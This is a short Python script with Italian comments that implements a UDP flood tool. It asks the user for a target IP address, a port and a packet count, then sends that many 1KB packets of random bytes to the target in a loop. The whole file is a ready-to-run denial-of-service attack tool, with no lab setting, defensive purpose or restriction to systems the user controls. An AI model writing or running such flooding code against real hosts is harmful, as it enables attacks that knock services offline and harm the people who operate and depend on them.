import socket
import random
import time

def udp_flood(target_ip, target_port, num_packets):
    # Crea un socket UDP
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Pacchetto di 1KB (1024 bytes)
    packet_data = random._urandom(1024)
    
    # Invia il numero richiesto di pacchetti
    print(f"Starting UDP flood to {target_ip}:{target_port} with {num_packets} packets...")
    
    for i in range(num_packets):
        client.sendto(packet_data, (target_ip, target_port))
        print(f"Packet {i+1} sent")
        
    print("UDP flood completed.")

def main():
    # Richiedi l'IP e la porta del target all'utente
    target_ip = input("Inserisci l'IP della macchina target: ")
    target_port = int(input("Inserisci la porta UDP della macchina target: "))
    
    # Richiedi quanti pacchetti inviare
    num_packets = int(input("Inserisci quanti pacchetti da 1KB inviare: "))
    
    # Avvia il flood UDP
    udp_flood(target_ip, target_port, num_packets)

if __name__ == "__main__":
    main()
